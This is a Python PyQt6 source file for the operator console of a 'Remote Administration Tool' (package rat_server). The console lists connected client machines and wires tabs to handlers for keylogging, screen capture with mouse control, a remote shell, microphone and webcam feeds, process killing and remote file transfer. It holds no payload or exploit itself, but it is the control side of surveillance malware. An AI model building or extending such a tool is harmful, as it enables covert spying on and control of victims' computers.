import sys
import json
import base64
import os
import time
import mimetypes
import shutil
import logging
from datetime import datetime
from pathlib import Path
import platform

from PyQt6.QtWidgets import (
    QMainWindow, QWidget, QHBoxLayout, QVBoxLayout, QGroupBox, QTableWidget,
    QTableWidgetItem, QHeaderView, QAbstractItemView, QTabWidget, QFormLayout,
    QLabel, QPushButton, QLineEdit, QTextEdit, QSlider, QScrollArea, QFileDialog,
    QMessageBox, QInputDialog, QDialog, QApplication, QStyle
)
from PyQt6.QtCore import Qt, QTimer, QMetaObject, Q_ARG, pyqtSlot, QSize, pyqtSignal, QThread
from PyQt6.QtGui import QPixmap, QImage, QTextCursor, QMouseEvent

# Import Core and Handlers
from rat_server.server_core.server_logic import ServerCore
from rat_server.handlers.client_handler import ClientHandler
from rat_server.handlers.process_handler import ProcessHandler
from rat_server.handlers.file_handler import FileHandler
from rat_server.handlers.monitoring_handler import MonitoringHandler
from rat_server.handlers.remote_control_handler import RemoteControlHandler
from rat_server.handlers.camera_handler import CameraHandler

logger = logging.getLogger(__name__)

class MainWindow(QMainWindow):
    # Define signals that handlers might emit to trigger actions in MainWindow
    # (Alternative to directly calling MainWindow methods from handlers)
    # e.g., show_message_signal = pyqtSignal(str, str, str)

    def __init__(self, server_core):
        super().__init__()
        self.server_core = server_core
        self.selected_client_addr_str = None
        self.clients_ui_data = {}  # Store UI-related data for each client
        self.current_path = None
        
        # Initialize paths
        self._initialize_paths()
        
        # Initialize handlers
        self.client_handler = ClientHandler(self)
        self.process_handler = ProcessHandler(self)
        self.file_handler = FileHandler(self)
        self.monitoring_handler = MonitoringHandler(self)
        self.remote_control_handler = RemoteControlHandler(self)
        self.camera_handler = CameraHandler(self)
        
        # Setup refresh timer
        self.refresh_timer = QTimer(self)
        self.refresh_timer.timeout.connect(self._refresh_data)
        self.refresh_timer.start(2000)  # Refresh every 2 seconds
        
        # Setup UI
        self.setWindowTitle("Remote Administration Tool")
        self.resize(1200, 800)
        self._setup_ui()
        
        # Register callbacks
        self._register_callbacks()

    def _initialize_paths(self):
        """Initializes download and temporary paths."""
        if platform.system() == 'Windows':
            self.download_path = os.path.join(os.path.expanduser("~"), "Downloads")
            self.temp_dir = os.path.join(os.getenv('TEMP', os.path.expanduser("~")), "RAT_Server_Temp")
        else:  # Linux/macOS
            self.download_path = os.path.join(os.path.expanduser("~"), "Downloads")
            try:
                app_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
                self.temp_dir = os.path.join(app_dir, "temp")
                if not os.access(app_dir, os.W_OK):
                    raise OSError("No write permission in app directory")
            except (OSError, NameError):
                import tempfile
                self.temp_dir = os.path.join(tempfile.gettempdir(), "RAT_Server_Temp")

        try:
            os.makedirs(self.temp_dir, exist_ok=True)
            logger.info(f"Using temp directory: {self.temp_dir}")
            os.makedirs(self.download_path, exist_ok=True)
            logger.info(f"Default download directory: {self.download_path}")
        except Exception as e:
            logger.error(f"Error creating directories: {e}")
            self._show_message_box("Directory Error", 
                                 f"Could not create necessary directories ({self.temp_dir}, {self.download_path}). Please check permissions.", 
                                 "warning")

    def _setup_ui(self):
        """Sets up the main layout and panels.
           Creates UI elements and stores references in self.
        """
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        main_layout = QHBoxLayout(main_widget)

        # Left Panel (Clients)
        left_panel = self._create_client_panel() # Creates self.clients_table
        main_layout.addWidget(left_panel, 1) # Takes ~1/3 of space

        # Right Panel (Tabs)
        self.tabs = QTabWidget()
        self._setup_tabs() # Creates tab widgets and their contents
        main_layout.addWidget(self.tabs, 2) # Takes ~2/3 of space

        # Connect UI signals
        self._connect_ui_signals()

    def _create_client_panel(self):
        """Creates the left panel containing the client list."""
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        left_layout.setContentsMargins(0, 0, 0, 0)

        clients_group = QGroupBox("Connected Clients")
        clients_layout = QVBoxLayout(clients_group)

        self.clients_table = QTableWidget()
        self.clients_table.setColumnCount(5)
        self.clients_table.setHorizontalHeaderLabels(["IP:Port", "Hostname", "OS", "CPU", "Memory"])
        self.clients_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.clients_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        self.clients_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.clients_table.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        # Connection moved to _connect_ui_signals
        # self.clients_table.itemSelectionChanged.connect(self._on_client_selected)
        self.clients_table.setSortingEnabled(True)
        clients_layout.addWidget(self.clients_table)

        left_layout.addWidget(clients_group)
        return left_panel

    def _setup_tabs(self):
        """Creates and adds all the tabs to the tab widget."""
        system_tab = self._create_system_tab()
        files_tab = self._create_files_tab()
        monitoring_tab = self._create_monitoring_tab()
        remote_tab = self._create_remote_tab()
        camera_tab = self._create_camera_tab()

        self.tabs.addTab(system_tab, "💻 System")
        self.tabs.addTab(files_tab, "📁 Files")
        self.tabs.addTab(monitoring_tab, "👁️ Monitoring")
        self.tabs.addTab(remote_tab, "🎮 Remote")
        self.tabs.addTab(camera_tab, "🎥 Camera")

    # --- Tab Creation Methods (Populate self with UI elements) ---

    def _create_system_tab(self):
        """Creates the System Information and Process Management tab."""
        tab = QWidget()
        layout = QVBoxLayout(tab)

        # System Info Group
        system_info_group = QGroupBox("System Information")
        system_info_layout = QFormLayout(system_info_group)
        self.hostname_label = QLabel("N/A")
        self.os_label = QLabel("N/A")
        self.cpu_label = QLabel("N/A")
        self.memory_label = QLabel("N/A")
        system_info_layout.addRow("Hostname:", self.hostname_label)
        system_info_layout.addRow("OS:", self.os_label)
        system_info_layout.addRow("CPU Usage:", self.cpu_label)
        system_info_layout.addRow("Memory Usage:", self.memory_label)
        layout.addWidget(system_info_group)

        # Processes Group
        processes_group = QGroupBox("Processes")
        processes_layout = QVBoxLayout(processes_group)
        self.process_table = QTableWidget()
        self.process_table.setColumnCount(5)
        self.process_table.setHorizontalHeaderLabels(["PID", "Name", "CPU %", "Memory %", "Status"])
        self.process_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.process_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        self.process_table.horizontalHeader().setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        self.process_table.horizontalHeader().setSectionResizeMode(3, QHeaderView.ResizeMode.ResizeToContents)
        self.process_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.process_table.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self.process_table.setSortingEnabled(True)

        process_buttons_layout = QHBoxLayout()
        self.refresh_proc_btn = QPushButton("🔄 Refresh") # Store refs
        self.kill_proc_btn = QPushButton("❌ Kill Process")
        self.start_proc_btn = QPushButton("▶️ Start Process")
        # Connections moved to _connect_ui_signals
        process_buttons_layout.addWidget(self.refresh_proc_btn)
        process_buttons_layout.addWidget(self.kill_proc_btn)
        process_buttons_layout.addWidget(self.start_proc_btn)
        process_buttons_layout.addStretch()

        processes_layout.addWidget(self.process_table)
        processes_layout.addLayout(process_buttons_layout)
        layout.addWidget(processes_group)

        layout.addStretch()
        return tab

    def _create_files_tab(self):
        """Creates the File Explorer tab."""
        tab = QWidget()
        layout = QVBoxLayout(tab)

        nav_group = QGroupBox("Navigation")
        nav_layout = QVBoxLayout(nav_group)
        path_layout = QHBoxLayout()
        path_layout.addWidget(QLabel("Current Path:"))
        self.path_edit = QLineEdit()
        self.path_edit.setReadOnly(True)
        path_layout.addWidget(self.path_edit)
        nav_layout.addLayout(path_layout)

        nav_buttons_layout = QHBoxLayout()
        self.up_dir_btn = QPushButton("⬆️ Up")
        self.refresh_files_btn = QPushButton("🔄 Refresh")
        self.new_dir_btn = QPushButton("📁 New Folder")
        self.upload_file_btn = QPushButton("⬆️ Upload")
        self.download_item_btn = QPushButton("⬇️ Download")
        self.view_file_btn = QPushButton("👁️ View")
        self.rename_item_btn = QPushButton("✏️ Rename")
        self.edit_file_btn = QPushButton("📝 Edit")
        # Connections moved
        nav_buttons_layout.addWidget(self.up_dir_btn)
        nav_buttons_layout.addWidget(self.refresh_files_btn)
        nav_buttons_layout.addWidget(self.new_dir_btn)
        nav_buttons_layout.addStretch()
        nav_buttons_layout.addWidget(self.upload_file_btn)
        nav_buttons_layout.addWidget(self.download_item_btn)
        nav_buttons_layout.addWidget(self.view_file_btn)
        nav_buttons_layout.addWidget(self.rename_item_btn)
        nav_buttons_layout.addWidget(self.edit_file_btn)
        nav_layout.addLayout(nav_buttons_layout)
        layout.addWidget(nav_group)

        files_group = QGroupBox("Files and Folders")
        files_layout = QVBoxLayout(files_group)
        self.files_table = QTableWidget()
        self.files_table.setColumnCount(4)
        self.files_table.setHorizontalHeaderLabels(["Name", "Type", "Size", "Modified"])
        self.files_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.files_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        self.files_table.horizontalHeader().setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        self.files_table.horizontalHeader().setSectionResizeMode(3, QHeaderView.ResizeMode.ResizeToContents)
        # Connections moved
        # self.files_table.itemDoubleClicked.connect(self.file_handler.on_file_double_clicked)
        self.files_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.files_table.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self.files_table.setSortingEnabled(True)
        self.files_table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        # self.files_table.customContextMenuRequested.connect(self.file_handler.show_files_context_menu)

        files_layout.addWidget(self.files_table)
        layout.addWidget(files_group)
        return tab

    def _create_monitoring_tab(self):
        """Creates the Keylogger tab."""
        tab = QWidget()
        layout = QVBoxLayout(tab)

        keylogger_group = QGroupBox("Keylogger")
        keylogger_layout = QVBoxLayout(keylogger_group)
        keylogger_buttons_layout = QHBoxLayout()
        self.start_keylogger_btn = QPushButton("▶️ Start Keylogger")
        self.stop_keylogger_btn = QPushButton("⏹️ Stop Keylogger")
        self.clear_keylog_btn = QPushButton("🗑️ Clear Log")
        self.keylog_text = QTextEdit()
        self.keylog_text.setReadOnly(True)
        keylogger_buttons_layout.addWidget(self.start_keylogger_btn)
        keylogger_buttons_layout.addWidget(self.stop_keylogger_btn)
        keylogger_buttons_layout.addStretch()
        keylogger_buttons_layout.addWidget(self.clear_keylog_btn)
        keylogger_layout.addLayout(keylogger_buttons_layout)
        keylogger_layout.addWidget(self.keylog_text)
        layout.addWidget(keylogger_group)

        layout.addStretch()
        return tab

    def _create_remote_tab(self):
        """Creates the Screen Capture and Remote Shell tab."""
        tab = QWidget()
        layout = QVBoxLayout(tab)

        # Screen Capture Group
        screen_group = QGroupBox("Screen Capture")
        screen_layout = QVBoxLayout(screen_group)
        screen_controls_layout = QHBoxLayout()

        zoom_layout = QHBoxLayout()
        zoom_layout.addWidget(QLabel("Zoom:"))
        self.zoom_slider = QSlider(Qt.Orientation.Horizontal)
        self.zoom_slider.setRange(10, 200)
        self.zoom_slider.setValue(100)
        self.zoom_label = QLabel("100%")
        self.zoom_label.setMinimumWidth(40)
        zoom_layout.addWidget(self.zoom_slider)
        zoom_layout.addWidget(self.zoom_label)

        self.start_screen_btn = QPushButton("▶️ Start Capture")
        self.stop_screen_btn = QPushButton("⏹️ Stop Capture")
        self.stop_screen_btn.setEnabled(False)

        controls_left_layout = QVBoxLayout()
        controls_left_layout.addLayout(zoom_layout)
        screen_controls_layout.addLayout(controls_left_layout)
        screen_controls_layout.addStretch()
        screen_controls_layout.addWidget(self.start_screen_btn)
        screen_controls_layout.addWidget(self.stop_screen_btn)

        self.scroll_area = QScrollArea()
        self.scroll_area.setWidgetResizable(True)
        self.scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAsNeeded)
        self.scroll_area.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAsNeeded)
        self.screen_label = QLabel()
        self.screen_label.setObjectName("ScreenLabel")
        self.screen_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.screen_label.setMinimumSize(640, 360)
        self.scroll_area.setWidget(self.screen_label)

        screen_layout.addLayout(screen_controls_layout)
        screen_layout.addWidget(self.scroll_area, 1)
        layout.addWidget(screen_group, 1)

        # Remote Shell Group
        shell_group = QGroupBox("Remote Shell")
        shell_layout = QVBoxLayout(shell_group)
        self.shell_output = QTextEdit()
        self.shell_output.setReadOnly(True)
        self.shell_output.setStyleSheet(""" /* Styles remain */ """)
        input_container = QWidget()
        input_layout = QHBoxLayout(input_container)
        input_layout.setContentsMargins(0, 0, 0, 0)
        prompt_label = QLabel(">")
        prompt_label.setStyleSheet("color: #00FF00; font-size: 13px; font-family: 'Consolas', 'Monaco', 'Courier New', monospace; padding: 5px;")
        self.shell_input = QLineEdit()
        self.shell_input.setPlaceholderText("Enter command and press Enter...")
        self.shell_input.setStyleSheet(self.shell_output.styleSheet())
        input_layout.addWidget(prompt_label)
        input_layout.addWidget(self.shell_input)
        shell_layout.addWidget(self.shell_output, 1)
        shell_layout.addWidget(input_container)
        layout.addWidget(shell_group, 1)

        # Audio Group
        audio_group = QGroupBox("Audio Capture")
        audio_layout = QVBoxLayout(audio_group)
        audio_buttons = QHBoxLayout()
        self.start_audio_btn = QPushButton("🎤 Start Audio")
        self.stop_audio_btn = QPushButton("⏹️ Stop Audio")
        self.stop_audio_btn.setEnabled(False)
        audio_buttons.addWidget(self.start_audio_btn)
        audio_buttons.addWidget(self.stop_audio_btn)
        audio_buttons.addStretch()
        self.audio_status = QLabel("Audio capture stopped")
        self.audio_status.setAlignment(Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignVCenter)
        audio_layout.addLayout(audio_buttons)
        audio_layout.addWidget(self.audio_status)
        layout.addWidget(audio_group)
        return tab

    def _create_camera_tab(self):
        """Creates the Camera View tab."""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        camera_group = QGroupBox("Camera Feed")
        camera_layout = QVBoxLayout(camera_group)
        camera_buttons = QHBoxLayout()
        self.start_camera_btn = QPushButton("▶️ Start Camera")
        self.stop_camera_btn = QPushButton("⏹️ Stop Camera")
        # Connections moved
        self.stop_camera_btn.setEnabled(False)
        camera_buttons.addWidget(self.start_camera_btn)
        camera_buttons.addWidget(self.stop_camera_btn)
        camera_buttons.addStretch()
        self.camera_label = QLabel("Camera feed stopped")
        self.camera_label.setObjectName("CameraLabel")
        self.camera_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.camera_label.setMinimumSize(640, 480)
        camera_layout.addLayout(camera_buttons)
        camera_layout.addWidget(self.camera_label, 1)
        layout.addWidget(camera_group)
        return tab

    def _connect_ui_signals(self):
         """Connect signals from UI elements to handler methods."""
         # Client Panel
         self.clients_table.itemSelectionChanged.connect(self._on_client_selected)

         # System Tab
         self.refresh_proc_btn.clicked.connect(self.process_handler.refresh_processes)
         self.kill_proc_btn.clicked.connect(self.process_handler.kill_selected_process)
         self.start_proc_btn.clicked.connect(self.process_handler.start_new_process)

         # Files Tab
         self.up_dir_btn.clicked.connect(self.file_handler.go_up_directory)
         self.refresh_files_btn.clicked.connect(self.file_handler.refresh_files)
         self.new_dir_btn.clicked.connect(self.file_handler.create_new_directory)
         self.upload_file_btn.clicked.connect(self.file_handler.upload_file_to_client)
         self.download_item_btn.clicked.connect(self.file_handler.download_selected_item)
         self.view_file_btn.clicked.connect(self.file_handler.view_selected_file)
         self.rename_item_btn.clicked.connect(self.file_handler.rename_selected_item)
         self.edit_file_btn.clicked.connect(self.file_handler.edit_selected_file)
         self.files_table.itemDoubleClicked.connect(self.file_handler.on_file_double_clicked)
         self.files_table.customContextMenuRequested.connect(self.file_handler.show_files_context_menu)

         # Monitoring Tab
         self.start_keylogger_btn.clicked.connect(self.monitoring_handler.start_keylogger)
         self.stop_keylogger_btn.clicked.connect(self.monitoring_handler.stop_keylogger)
         self.clear_keylog_btn.clicked.connect(self.keylog_text.clear)

         # Remote Tab
         self.zoom_slider.valueChanged.connect(self.remote_control_handler.update_screen_zoom)
         self.start_screen_btn.clicked.connect(self.remote_control_handler.start_screen_capture)
         self.stop_screen_btn.clicked.connect(self.remote_control_handler.stop_screen_capture)
         self.screen_label.mousePressEvent = self.remote_control_handler.screen_mouse_press
         self.screen_label.mouseReleaseEvent = self.remote_control_handler.screen_mouse_release
         self.screen_label.mouseDoubleClickEvent = self.remote_control_handler.screen_mouse_double_click
         self.shell_input.returnPressed.connect(self.remote_control_handler.send_shell_command)
         self.start_audio_btn.clicked.connect(self.remote_control_handler.start_audio_capture)
         self.stop_audio_btn.clicked.connect(self.remote_control_handler.stop_audio_capture)

         # Camera Tab
         self.start_camera_btn.clicked.connect(self.camera_handler.start_camera_feed)
         self.stop_camera_btn.clicked.connect(self.camera_handler.stop_camera_feed)

         logger.debug("UI signals connected to handlers.")

    def _register_callbacks(self):
        """Connects callbacks from ServerCore to the appropriate handlers."""
        if not self.server_core: return

        callbacks = self.server_core.callbacks

        # Client Handler Callbacks
        callbacks['on_client_connected'] = self.client_handler.handle_client_connected
        callbacks['on_client_disconnected'] = self.client_handler.handle_client_disconnected
        callbacks['on_system_info'] = self.client_handler.handle_system_info

        # Process Handler Callbacks
        callbacks['on_command_list_processes'] = self.process_handler.handle_process_list

        # File Handler Callbacks
        callbacks['on_command_list_directory'] = self.file_handler.handle_directory_listing
        callbacks['on_command_read_file'] = self.file_handler.handle_file_content
        callbacks['on_command_file_data'] = self.file_handler.handle_file_download_data
        callbacks['on_command_write_file'] = self.file_handler.handle_write_file_response
        callbacks['on_command_rename_file'] = self.file_handler.handle_rename_file_response
        callbacks['on_command_file_uploaded'] = self.file_handler.handle_upload_response

        # Monitoring Handler Callbacks
        callbacks['on_command_keylog'] = self.monitoring_handler.handle_keylog

        # Remote Control Handler Callbacks
        callbacks['on_command_screenshot'] = self.remote_control_handler.handle_screenshot
        callbacks['on_command_shell_output'] = self.remote_control_handler.handle_shell_output
        callbacks['on_command_audio'] = self.remote_control_handler.handle_audio_data

        # Camera Handler Callbacks
        callbacks['on_command_camera'] = self.camera_handler.handle_camera_frame

        # Generic Error Callback
        callbacks['on_command_error'] = self._handle_command_error
        callbacks['on_binary_data'] = self._handle_unexpected_binary

        logger.info("Server callbacks registered successfully.")

    # --- GUI Event Handlers & Actions --- ###
    # Most actions are now delegated to handlers via _connect_ui_signals
    # Keep only actions directly related to main window state, like client selection

    @pyqtSlot(str, bool)
    def _update_client_connection_status(self, addr_str, connected):
        try:
            if connected:
                if addr_str not in self.clients_ui_data:
                    # Créer une nouvelle entrée pour le client
                    self.clients_ui_data[addr_str] = {
                        'hostname': 'N/A',
                        'os': 'N/A',
                        'cpu': 'N/A',
                        'mem': 'N/A',
                        'current_path': None
                    }
                    # Ajouter une nouvelle ligne dans la table
                    row = self.clients_table.rowCount()
                    self.clients_table.insertRow(row)
                    # Remplir les colonnes avec des valeurs par défaut
                    self.clients_table.setItem(row, 0, QTableWidgetItem(addr_str))
                    self.clients_table.setItem(row, 1, QTableWidgetItem('N/A'))
                    self.clients_table.setItem(row, 2, QTableWidgetItem('N/A'))
                    self.clients_table.setItem(row, 3, QTableWidgetItem('N/A'))
                    self.clients_table.setItem(row, 4, QTableWidgetItem('N/A'))

            # Mettre à jour la couleur de la ligne
            row = self._get_row_for_addr_str(addr_str)
            if row is not None:
                color = Qt.GlobalColor.green if connected else Qt.GlobalColor.red
                for col in range(self.clients_table.columnCount()):
                    item = self.clients_table.item(row, col)
                    if item:
                        item.setBackground(color)

            # Si le client est déconnecté, le supprimer des données
            if not connected:
                if addr_str in self.clients_ui_data:
                    del self.clients_ui_data[addr_str]
                # Si c'était le client sélectionné, effacer la sélection
                if addr_str == self.selected_client_addr_str:
                    self.selected_client_addr_str = None
                    self._clear_client_specific_ui()
                # Supprimer la ligne de la table
                if row is not None:
                    self.clients_table.removeRow(row)

        except Exception as e:
            print(f"Erreur lors de la mise à jour du statut de connexion : {e}")

    @pyqtSlot(str, str, str, str, str)
    def _update_client_sys_info(self, addr_str, hostname, os_info, cpu, mem):
        """Updates the client system info in the UI."""
        if addr_str in self.clients_ui_data:
            # Update table
            row = self._get_row_for_addr_str(addr_str)
            if row is not None:
                self.clients_table.item(row, 1).setText(hostname)
                self.clients_table.item(row, 2).setText(os_info)
                self.clients_table.item(row, 3).setText(cpu)
                self.clients_table.item(row, 4).setText(mem)
            
            # Update system info labels if this is the selected client
            if addr_str == self.selected_client_addr_str:
                self.hostname_label.setText(hostname)
                self.os_label.setText(os_info)
                self.cpu_label.setText(cpu)
                self.memory_label.setText(mem)

    def _get_row_for_addr_str(self, addr_str):
        """Gets the row index for a given address string in the clients table."""
        for row in range(self.clients_table.rowCount()):
            item = self.clients_table.item(row, 0)
            if item and item.text() == addr_str:
                return row
        return None

    def _on_client_selected(self):
        """Handles selection changes in the clients table."""
        selected_items = self.clients_table.selectedItems()
        newly_selected_addr_str = None
        if selected_items:
            row = selected_items[0].row()
            try:
                 newly_selected_addr_str = self.clients_table.item(row, 0).text()
            except AttributeError: # Item might not exist yet if table is updating
                 logger.warning("Selected item invalid during selection change.")
                 return

        # Check if selection actually changed
        if newly_selected_addr_str != self.selected_client_addr_str:
            old_selection = self.selected_client_addr_str
            self.selected_client_addr_str = newly_selected_addr_str

            if self.selected_client_addr_str:
                logger.info(f"Client selected: {self.selected_client_addr_str}")
                # Stop streams from the *previously* selected client
                if old_selection:
                     self._stop_streams_for_client(old_selection)

                # Clear UI before loading new data
                self._clear_client_specific_ui(clear_tables=True)
                # Update the static info display immediately
                self.client_handler.update_selected_client_details()
                # Request dynamic data for the newly selected client
                self.process_handler.refresh_processes()
                self.file_handler.refresh_files()
            else:
                 logger.info("Client selection cleared.")
                 # Stop streams from the previously selected client
                 if old_selection:
                      self._stop_streams_for_client(old_selection)
                 # Clear all client-specific UI elements
                 self._clear_client_specific_ui(clear_tables=True)
                 self.client_handler.update_selected_client_details() # Clear the info panel


    def _stop_streams_for_client(self, addr_str):
         """Instructs handlers to stop active streams for a given client address string."""
         logger.debug(f"Stopping streams for deselected/disconnected client: {addr_str}")
         # Need address tuple to send commands
         try:
              ip, port_str = addr_str.split(':')
              address = (ip, int(port_str))
         except Exception as e:
              logger.error(f"Could not parse address to stop streams: {addr_str} - {e}")
              return

         # Call stop methods on handlers (they check if client matches internally)
         # Use force=True because the client is no longer selected
         self.remote_control_handler.stop_screen_capture(force=True)
         self.remote_control_handler.stop_audio_capture(force=True)
         self.camera_handler.stop_camera_feed(force=True)
         self.monitoring_handler.stop_keylogger() # These don't need force usually

    def _get_selected_client_address(self):
        """Gets the address tuple of the currently selected client."""
        # This remains a useful helper method in MainWindow
        if self.selected_client_addr_str:
            try:
                ip, port_str = self.selected_client_addr_str.split(':')
                return (ip, int(port_str))
            except (ValueError, AttributeError) as e:
                logger.error(f"Invalid selected client address format: {self.selected_client_addr_str} - {e}")
                return None
        return None

    def _get_current_client_path(self):
         """Gets the known current path for the selected client from UI data."""
         # Also useful helper
         if self.selected_client_addr_str and self.selected_client_addr_str in self.clients_ui_data:
              return self.clients_ui_data[self.selected_client_addr_str].get('current_path')
         return None

    def _clear_client_specific_ui(self, clear_tables=False):
         """Clears UI elements specific to a selected client."""
         # Clear text areas
         self.keylog_text.clear()
         self.shell_output.clear()
         self.shell_input.clear()
         self.screen_label.clear()
         self.camera_label.setText("Camera feed stopped")
         self.camera_label.clear()
         self.remote_control_handler.current_pixmap = None
         self.zoom_slider.setValue(100)
         self.zoom_label.setText("100%")
         self.audio_status.setText("Audio capture stopped")

         # Reset button states
         self.stop_screen_btn.setEnabled(False)
         self.start_screen_btn.setEnabled(True)
         self.stop_camera_btn.setEnabled(False)
         self.start_camera_btn.setEnabled(True)
         self.stop_audio_btn.setEnabled(False)
         self.start_audio_btn.setEnabled(True)

         if clear_tables:
              self.process_table.setRowCount(0)
              self.files_table.setRowCount(0)
              self.path_edit.clear()

    @pyqtSlot(str, str, str) # Make this a slot if called via signal
    def _show_message_box(self, title, text, icon_type="information", parent=None):
         """Helper to display message boxes safely from any thread."""
         # Keep this helper in MainWindow for convenience
         icon = QMessageBox.Icon.Information
         if icon_type == "warning":
              icon = QMessageBox.Icon.Warning
         elif icon_type == "critical":
              icon = QMessageBox.Icon.Critical

         # Ensure it runs in the GUI thread if called from elsewhere
         # Check if QApplication instance exists and if current thread is GUI thread
         app_instance = QApplication.instance()
         if app_instance and app_instance.thread() != QThread.currentThread():
             QMetaObject.invokeMethod(self, "_show_message_box", Qt.ConnectionType.QueuedConnection,
                                      Q_ARG(str, title), Q_ARG(str, text), Q_ARG(str, icon_type))
             return

         # Use parent=self if parent is None for correct modality
         msgBox = QMessageBox(icon, title, text, QMessageBox.StandardButton.Ok, parent if parent else self)
         msgBox.exec()

    # --- Generic Callbacks (Handled in MainWindow) ---

    def _handle_command_error(self, address, error_data):
        """Handles generic error responses from client commands."""
        addr_str = f"{address[0]}:{address[1]}"
        error_message = error_data.get('message', 'Unknown error occurred on client.')
        logger.error(f"Command error reported by client {addr_str}: {error_message}")
        self._show_message_box("Client Command Error",
                               f"Client {addr_str} reported an error:\n{error_message}",
                               "warning")

    def _handle_unexpected_binary(self, address, binary_data):
         """Handles binary data received unexpectedly (not part of a known command response)."""
         addr_str = f"{address[0]}:{address[1]}"
         logger.warning(f"Received unexpected raw binary data ({len(binary_data)} bytes) from {addr_str}. Ignoring.")
         # Potentially log the first few bytes for debugging
         # logger.debug(f"Unexpected binary data (start): {binary_data[:64]!r}")

    @pyqtSlot(object)
    def _update_process_table(self, processes):
        """Updates the process table with the received process list."""
        try:
            self.process_table.setRowCount(0)
            for proc in processes:
                row = self.process_table.rowCount()
                self.process_table.insertRow(row)
                self.process_table.setItem(row, 0, QTableWidgetItem(str(proc['pid'])))
                self.process_table.setItem(row, 1, QTableWidgetItem(proc['name']))
                self.process_table.setItem(row, 2, QTableWidgetItem(str(proc['cpu'])))
                self.process_table.setItem(row, 3, QTableWidgetItem(str(proc['memory'])))
                self.process_table.setItem(row, 4, QTableWidgetItem(proc['status']))
        except Exception as e:
            logger.error(f"Error updating process table: {e}")

    @pyqtSlot(object)
    def _update_files_table(self, files_data):
        """Updates the files table with the received directory listing."""
        try:
            self.files_table.setRowCount(0)
            if 'current_path' in files_data:
                self.path_edit.setText(files_data['current_path'])
                if self.selected_client_addr_str:
                    self.clients_ui_data[self.selected_client_addr_str]['current_path'] = files_data['current_path']

            for file_info in files_data.get('files', []):
                row = self.files_table.rowCount()
                self.files_table.insertRow(row)
                self.files_table.setItem(row, 0, QTableWidgetItem(file_info['name']))
                self.files_table.setItem(row, 1, QTableWidgetItem(file_info['type']))
                self.files_table.setItem(row, 2, QTableWidgetItem(file_info['size']))
                self.files_table.setItem(row, 3, QTableWidgetItem(file_info['modified']))
        except Exception as e:
            logger.error(f"Error updating files table: {e}")

    @pyqtSlot(str)
    def _update_camera_label(self, frame_data):
        """Updates the camera feed label with new frame data."""
        try:
            image_data = base64.b64decode(frame_data)
            pixmap = QPixmap()
            pixmap.loadFromData(image_data)
            if not pixmap.isNull():
                self.camera_label.setPixmap(pixmap.scaled(
                    self.camera_label.size(),
                    Qt.AspectRatioMode.KeepAspectRatio,
                    Qt.TransformationMode.SmoothTransformation
                ))
            else:
                self.camera_label.setText("Invalid frame data")
        except Exception as e:
            self.camera_label.setText(f"Error: {str(e)}")

    @pyqtSlot(str)
    def _update_screen_label(self, frame_data):
        """Updates the screen capture label with new frame data."""
        try:
            image_data = base64.b64decode(frame_data)
            pixmap = QPixmap()
            pixmap.loadFromData(image_data)
            if not pixmap.isNull():
                self.remote_control_handler.current_pixmap = pixmap
                scaled_pixmap = pixmap.scaled(
                    self.screen_label.size(),
                    Qt.AspectRatioMode.KeepAspectRatio,
                    Qt.TransformationMode.SmoothTransformation
                )
                self.screen_label.setPixmap(scaled_pixmap)
            else:
                self.screen_label.setText("Invalid frame data")
        except Exception as e:
            self.screen_label.setText(f"Error: {str(e)}")

    def _refresh_data(self):
        """Refreshes system information and process list for the selected client."""
        try:
            if self.selected_client_addr_str:
                address = self._get_selected_client_address()
                if address:
                    # Request system info update
                    self.server_core.send_command(address, "get_system_info")
                    # Request process list update if we're on the System tab
                    if self.tabs.currentWidget() == self.system_tab:
                        self.process_handler.refresh_processes()
        except Exception as e:
            logger.error(f"Error refreshing data: {e}")

    # --- Window Close Event --- ###

    def closeEvent(self, event):
        """Handles the main window closing."""
        logger.info("Close event triggered. Stopping server...")
        if self.server_core:
             self.server_core.stop() # Tell the core server to shut down
        logger.info("Server stop requested. Accepting close event.")
        # Clean up temp dir?
        if hasattr(self, 'temp_dir') and os.path.exists(self.temp_dir):
             try:
                  # shutil.rmtree(self.temp_dir) # Careful with automatic deletion
                  logger.info(f"Temporary directory {self.temp_dir} contents can be manually removed.")
             except Exception as e:
                  logger.warning(f"Could not remove temp directory {self.temp_dir}: {e}")
        event.accept() 